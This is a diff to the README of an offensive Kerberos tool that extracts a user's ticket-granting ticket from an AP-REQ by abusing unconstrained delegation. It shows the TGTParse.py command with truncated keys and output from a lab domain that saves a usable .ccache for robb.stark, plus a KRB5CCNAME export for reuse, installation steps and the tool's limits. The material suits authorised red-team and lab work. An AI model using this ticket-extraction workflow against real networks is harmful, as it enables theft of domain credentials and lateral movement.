@@ -96,25 +96,39 @@ AES256
 ```
 
 ## Extract TGT
-At present, the method for extracting the TGT from the ap-req has not been redone. An implementation is planned for the future.
-
-Connor McGarr (@33y0re) has already made an offline implementation:
+You can use TGTParse.py code to extract the TGT from the AP-REQ using the session key.
+The TGTParse.py code was a refactor of the version available on Github : [https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse](https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse) by Connor McGarr (@33y0re).
 ```
-.\tgtParse.exe --sessionkey W0612fo...(snip)...43JYdqc= --apreq YIINBwYJKoZIh...(snip)...vcSAQICAysc3 --etype AES256
+.python TGTParse.py  --sessionkey W0612fo...(snip)...43JYdqc= --apreq YIINBwYJKoZIh...(snip)...vcSAQICAysc3 --etype AES256
+
 [+] Identified ticket for robb.stark@NORTH.SEVENKINGDOMS.LOCAL
 [+] Successfully extracted the TGT! Saved as: robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache!
-Local path to usable .ccache: C:\...(snip)...\robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache
+[*] Local path to usable .ccache: /home/wuentin/Desktop/TGToast/robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache
+[*] Usage: export KRB5CCNAME=/home/wuentin/Desktop/TGToast/robb.stark@NORTH.SEVENKINGDOMS.LOCAL.ccache
+
 ```
-- [https://github.com/connormcgarr/tgtdelegation/tree/master](https://github.com/connormcgarr/tgtdelegation/tree/master)
-- [https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse](https://github.com/connormcgarr/tgtdelegation/tree/master/tgtParse)
+
+### Usage
+```
+# Create virtual environment
+python3 -m venv tgtparse-env
+
+# Activate virtual environment
+source tgtparse-env/bin/activate 
+
+# Install dependencies
+pip install impacket pyasn1
+
+# Run the tool
+python3 tgtParse.py --apreq <BASE64_APREQ> --sessionkey <BASE64_KEY> --etype <AES256|AES128|RC4>
+```
 ## Limits
-There are a few limitations,it doesn't work if the target accounts are:
+There are a few limitations, it doesn't work if the target accounts are:
 - member of protected users;
 - account is sensitive and cannot be delegated.
 
 ## ToDo
-- Code rework, the current code is a poc, not the definitive code (and it's ugly)
-- Extract TGT from ap-req using Session Key
+- Code rework, the current code is a poc, not the definitive code.
 
 ## Credits
 Many thanks to these projects, all I did was put the ideas together.
